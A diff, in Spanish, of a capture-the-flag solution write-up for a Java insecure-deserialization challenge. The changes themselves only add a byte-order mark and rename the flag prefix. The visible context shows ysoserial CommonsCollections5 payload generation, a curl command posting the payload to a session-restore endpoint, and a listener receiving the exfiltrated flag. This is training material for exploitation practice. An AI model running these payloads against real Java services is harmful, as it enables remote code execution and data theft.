@@ -1,4 +1,4 @@
-# Solucion - pwn-javadeser-02 - Equicore
+﻿# Solucion - pwn-javadeser-02 - Equicore
 
 **Categoria:** pwn - **Dificultad:** insane - **Vuln central:** deserializacion
 insegura de Java (CWE-502) con gadget chain de Apache Commons Collections
@@ -77,7 +77,7 @@ java -jar ysoserial-all.jar CommonsCollections5 \
 # 3) Enviala como la sesion guardada:
 curl -s -X POST "http://<host>:8080/api/session/restore" \
      --data "state=$(cat payload.b64)"
-# -> tu listener recibe  GET /?f=flag{...}
+# -> tu listener recibe  GET /?f=HL4{...}
 ```
 
 > El truco `sh -c $@|sh . echo <cmd>` es el patron estandar de ysoserial para
